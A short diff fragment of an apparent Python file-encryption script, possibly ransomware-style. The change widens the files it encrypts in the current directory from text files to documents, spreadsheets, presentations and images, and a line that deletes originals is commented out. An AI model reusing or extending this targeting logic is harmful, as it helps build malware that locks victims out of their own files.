@@ -63,7 +63,7 @@ def encrypt_file(file_name, cleartext_key, encrypted_key):
 	#os.remove(file_name)
 
 def main():
-	ext = [".txt"]
+	ext = [".txt","csv","jpg",".docx",".pdf",".pptx",".png",".xlsx"]
 	files_to_enc = []
 	#dir_path = os.path.dirname(os.path.realpath(__file__))
 	dir_path = os.getcwd()
